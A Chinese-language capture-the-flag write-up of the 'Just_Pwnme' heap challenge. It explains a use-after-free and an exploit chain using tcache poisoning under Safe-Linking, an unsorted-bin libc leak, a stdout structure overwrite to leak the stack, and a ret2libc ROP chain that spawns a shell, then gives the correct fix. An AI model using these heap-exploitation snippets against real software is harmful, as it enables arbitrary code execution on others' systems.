# Just_Pwnme

## 题目简述

服务维护两个堆块槽位，支持申请、释放、打印和编辑。`free(Allocation[index])` 后既不清空指针，也不清空记录的大小，因此已释放块仍可被读取和改写，形成完整的 use-after-free。题目使用的 glibc 启用了 tcache Safe-Linking；二进制本身还有 PIE、NX、栈 Canary 和 Full RELRO，无法直接依赖固定地址或 GOT 覆盖。

官方利用链依次完成堆地址泄露、tcache poisoning、伪造大块进入 unsorted bin、libc 泄露、`stdout` 文件结构泄露栈地址，最后再次投毒 tcache，将 ROP 链写到 `main` 的返回地址。

## 解题过程

释放逻辑没有消除悬空引用：

```c
case 1:
    index = choice(1);
    free(Allocation[index]);
    break;

case 2:
    index = choice(1);
    printf("%s\n", Allocation[index]);
    break;

case 3:
    index = choice(1);
    read(0, Allocation[index], Size[index]);
    break;
```

先申请并释放一个 `0x20` 字节块。tcache 链尾的 `fd` 原本是 `NULL`，Safe-Linking 后存储值就是 `chunk_addr >> 12`。通过打印悬空块并把泄露值左移 12 位，可恢复堆页地址。

Safe-Linking 中，位于地址 $L$ 的空闲块要指向目标 $P$，其 `fd` 应写为 $P \oplus (L \gg 12)$：

```python
def protect_ptr(target, chunk_addr):
    return p64(target ^ (chunk_addr >> 12))
```

接着申请两个同尺寸块，按相反顺序释放，再通过 UAF 编辑链首 `fd`。官方脚本把下一次 tcache 分配导向 `heap_base + 0x2c0`，在受控位置构造大小为 `0x501` 的块头。经过若干 `0x100`、`0x70` 和保护块申请后释放该伪造大块，使其进入 unsorted bin；UAF 打印其中的 `main_arena` 指针并减去给定 libc 的 `0x219ce0`，得到 libc 基址。

Full RELRO 使 GOT 不可写，因此下一阶段改为攻击 libc 的 `_IO_2_1_stdout_`。对 `0x100` tcache 链再次投毒，让一次申请返回 `stdout`，写入如下关键字段：

```python
environ = libc.sym.environ
fake_stdout = flat(
    0xFBAD1800,
    environ,
    environ,
    environ,
    environ,
    environ + 8,
    environ + 8,
    environ + 8,
    environ + 8,
)
```

被破坏的 `stdout` 会把 `environ` 附近内容作为待输出缓冲区，从而泄露当前栈地址。官方环境中，`main` 的 saved RIP 位于该泄露值减 `0x120` 处。

最后重复 `0x100` tcache poisoning，将目标设为 `saved_rip-8`。第一次申请消耗正常块，第二次申请返回栈地址，并写入一项对齐填充及 ret2libc 链：

```python
pop_rdi = libc.address + 0x2A3E5
bin_sh = next(libc.search(b"/bin/sh\x00"))
ret = pop_rdi + 1

chain = flat(
    0xDEADBEEFDEADBEEF,
    pop_rdi,
    bin_sh,
    ret,
    libc.sym.system,
)
```

选择退出菜单后，`main` 返回到该链并执行 `system("/bin/sh")`。读取 flag 得到：

```text
shellmates{S3E_Y0U_DONt_n33d_H00Ks_TO_pWN_the_HeAP}
```

## 方法总结

本题没有依赖已经移除的 malloc/free hook，而是把同一个 UAF 原语逐级放大：先从 tcache 元数据恢复堆地址，再伪造 unsorted-bin 泄露 libc，随后利用 `stdout` 泄露栈，最后把 tcache 分配导向 saved RIP。每一步得到的地址都为下一步解除随机化。

Safe-Linking 只能使伪造 freelist 指针需要额外掌握堆地址，并不能修复悬空指针。正确修复是在释放后立即把槽位指针设为 `NULL`、大小归零，并在打印和编辑前验证槽位仍处于已分配状态；同时应拒绝对已占用槽位重复申请，避免进一步丢失分配状态。
